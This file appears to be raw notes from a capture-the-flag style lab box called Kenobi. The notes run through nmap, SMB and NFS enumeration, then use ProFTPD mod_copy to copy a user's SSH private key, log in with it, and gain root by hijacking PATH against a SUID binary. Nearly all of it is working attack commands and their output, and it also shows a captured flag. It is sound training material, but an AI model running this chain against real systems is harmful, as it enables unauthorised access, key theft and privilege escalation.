@@ -1,0 +1,374 @@
+
+
+Samba  // smbclient  //  SSH  (access)  //   SUID (escalating)
+
+
+
+nmap -sC -sS -sV -T4 -O -n -Pn 10.10.84.13 -oN nmap1
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 14:57 EST
+Nmap scan report for 10.10.84.13
+Host is up (0.11s latency).
+Not shown: 993 closed ports
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      39142/udp   mountd
+|   100005  1,2,3      40855/tcp   mountd
+|   100005  1,2,3      43046/udp6  mountd
+|   100005  1,2,3      50101/tcp6  mountd
+|   100021  1,3,4      35983/tcp6  nlockmgr
+|   100021  1,3,4      39363/tcp   nlockmgr
+|   100021  1,3,4      56541/udp   nlockmgr
+|   100021  1,3,4      60627/udp6  nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=2/19%OT=21%CT=1%CU=38796%PV=Y%DS=2%DC=I%G=Y%TM=6030186
+OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=8)SEQ
+OS:(SP=101%GCD=1%ISR=10A%TI=Z%II=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O
+OS:3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=
+OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSN
+OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
+OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
+OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
+OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
+OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2021-02-19T13:58:31-06:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-02-19T19:58:31
+|_  start_date: N/A
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.10 seconds
+
+
+
+nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.84.13
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 15:01 EST
+Nmap scan report for 10.10.84.13
+Host is up (0.13s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.84.13\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 1
+|     Max Users: <unlimited>
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.84.13\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.84.13\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: <unlimited>
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: <none>
+|_    Current user access: <none>
+
+Nmap done: 1 IP address (1 host up) scanned in 19.56 seconds
+
+
+smbclient //10.10.84.13/anonymous                
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> whoami
+whoami: command not found
+smb: \> getuid
+getuid: command not found
+smb: \> ls
+  .                                   D        0  Wed Sep  4 06:49:09 2019
+  ..                                  D        0  Wed Sep  4 06:56:07 2019
+  log.txt                             N    12237  Wed Sep  4 06:49:09 2019
+
+		9204224 blocks of size 1024. 6877088 blocks available
+smb: \> cat log.txt
+cat: command not found
+smb: \> echo log.txt
+echo <num> <data>
+smb: \> more log.txt
+getting file \log.txt of size 12237 as /tmp/smbmore.duMPY0 (25.7 KiloBytes/sec) (average 25.7 KiloBytes/sec)
+smb: \> get log.txt
+getting file \log.txt of size 12237 as log.txt (9.0 KiloBytes/sec) (average 13.4 KiloBytes/sec)
+smb: \> ^C
+
+
+
+
+
+
+
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.84.13      130 ⨯
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 15:10 EST
+Nmap scan report for 10.10.84.13
+Host is up (0.13s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-ls: Volume /var
+|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
+| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
+| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
+| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
+| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
+| rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
+| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
+| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
+| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
+| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
+| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
+|_
+| nfs-showmount: 
+|_  /var *
+| nfs-statfs: 
+|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
+|_  /var        9204224.0  1836524.0  6877104.0  22%   16.0T        32000
+
+Nmap done: 1 IP address (1 host up) scanned in 3.40 seconds
+
+
+
+
+
+proftp 
+
+
+
+root💀kali)-[/hackme/kenobi]
+└─# searchsploit proftpd 1.3.5
+---------------------------------------------- ---------------------------------
+ Exploit Title                                |  Path
+---------------------------------------------- ---------------------------------
+ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
+ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
+ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
+---------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+
+
+
+(root💀kali)-[/hackme/kenobi]
+└─# nc 10.10.84.13 21                                               
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.84.13]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+quit
+221 Goodbye.
+
+
+
+(root💀kali)-[/hackme/kenobi]
+└─# nc 10.10.84.13 21                                               
+220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.84.13]
+SITE CPFR /home/kenobi/.ssh/id_rsa
+350 File or directory exists, ready for destination name
+SITE CPTO /var/tmp/id_rsa
+250 Copy successful
+quit
+221 Goodbye.
+                                                                                
+┌──(root💀kali)-[/hackme/kenobi]
+└─# mkdir /mnt/kenobiNFS
+                                                                                
+┌──(root💀kali)-[/hackme/kenobi]
+└─# mount 10.10.84.13:/var /mnt/kenobiNFS
+                                                                                
+┌──(root💀kali)-[/hackme/kenobi]
+└─# ls -la /mnt/kenobiNFS                
+total 56
+drwxr-xr-x 14 root root    4096 Sep  4  2019 .
+drwxr-xr-x  3 root root    4096 Feb 19 15:38 ..
+drwxr-xr-x  2 root root    4096 Sep  4  2019 backups
+drwxr-xr-x  9 root root    4096 Sep  4  2019 cache
+drwxrwxrwt  2 root root    4096 Sep  4  2019 crash
+drwxr-xr-x 40 root root    4096 Sep  4  2019 lib
+drwxrwsr-x  2 root staff   4096 Apr 12  2016 local
+lrwxrwxrwx  1 root root       9 Sep  4  2019 lock -> /run/lock
+drwxrwxr-x 10 root crontab 4096 Sep  4  2019 log
+drwxrwsr-x  2 root mail    4096 Feb 26  2019 mail
+drwxr-xr-x  2 root root    4096 Feb 26  2019 opt
+lrwxrwxrwx  1 root root       4 Sep  4  2019 run -> /run
+drwxr-xr-x  2 root root    4096 Jan 29  2019 snap
+drwxr-xr-x  5 root root    4096 Sep  4  2019 spool
+drwxrwxrwt  6 root root    4096 Feb 19 15:33 tmp
+drwxr-xr-x  3 root root    4096 Sep  4  2019 www
+                                            
+
+
+
+                                    
+┌──(root💀kali)-[/hackme/kenobi]
+└─# cp /mnt/kenobiNFS/tmp/id_rsa .
+                                                                                
+┌──(root💀kali)-[/hackme/kenobi]
+└─# sudo chmod 600 id_rsa                           
+                                                                                
+┌──(root💀kali)-[/hackme/kenobi]
+└─# ssh -i id_rsa kenobi@10.10.84.13
+The authenticity of host '10.10.84.13 (10.10.84.13)' can't be established.
+ECDSA key fingerprint is SHA256:uUzATQRA9mwUNjGY6h0B/wjpaZXJasCPBY30BvtMsPI.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.84.13' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+103 packages can be updated.
+65 updates are security updates.
+
+
+Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+kenobi@kenobi:~$ whoami
+kenobi
+kenobi@kenobi:~$ id
+uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+kenobi@kenobi:~$ ls
+share  user.txt
+kenobi@kenobi:~$ cat user.txt
+d0b0f3f53b6caa532a83915e19224899
+kenobi@kenobi:~$ 
+
+
+escalating
+
+
+SUID
+
+"SUID (Set owner User ID up on execution) is a special type of file permissions given to a file. SUID bits can be extremely dangerous. 
+Some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system). 
+However, other custom files that have the SUID bit can lead to all sorts of issues."
+
+find / -perm -u=s -type f 2>/dev/null
+
+
+kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
+/sbin/mount.nfs
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/bin/chfn
+/usr/bin/newgidmap
+/usr/bin/pkexec
+/usr/bin/passwd
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/menu			# this is supposed to look out of the ordinary
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/newgrp
+/bin/umount
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+
+
+
+
+cd /tmp
+echo /bin/sh > curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+
+
+/usr/bin/menu
+
+
+
+
+kenobi@kenobi:~$ cd /tmp
+kenobi@kenobi:/tmp$ echo /bin/sh > curl
+kenobi@kenobi:/tmp$ chmod 777 curl
+kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
+kenobi@kenobi:/tmp$ echo $PATH
+/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+kenobi@kenobi:/tmp$ /usr/bin/menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# 
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# whoami
+root
+# 
+
